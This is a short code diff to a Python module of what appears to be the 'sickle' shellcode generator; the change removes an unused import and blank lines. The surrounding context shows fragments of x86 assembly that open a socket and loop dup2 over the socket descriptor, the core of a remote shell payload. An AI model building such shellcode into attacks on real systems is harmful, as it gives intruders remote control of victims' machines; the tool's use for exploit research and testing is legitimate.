@@ -1,5 +1,4 @@
 import sys
-import ctypes
 import struct
 
 from sickle.common.lib.generic import convert
@@ -79,7 +78,6 @@ class Shellcode():
             ; int syscall(SYS_socketcall,      // EAX => socketcall syscall
             ;             int call,            // EBX => SYS_SOCKET
             ;             unsigned long *args) // ECX => *(int domain, int type, protocol)
-            
             xor ebx, ebx
             mul ebx
             push ebx
@@ -93,7 +91,6 @@ class Shellcode():
             ; i = 2
             ; while (i <= 0)
             ;   dup2(sockfd, i--)
-            
             xchg eax, ebx                          ; Save the socket file descriptor into ECX (sockfd)
             pop ecx                                ; Initialize the loop counter (0x2 was last pushed onto the stack)
         loop:
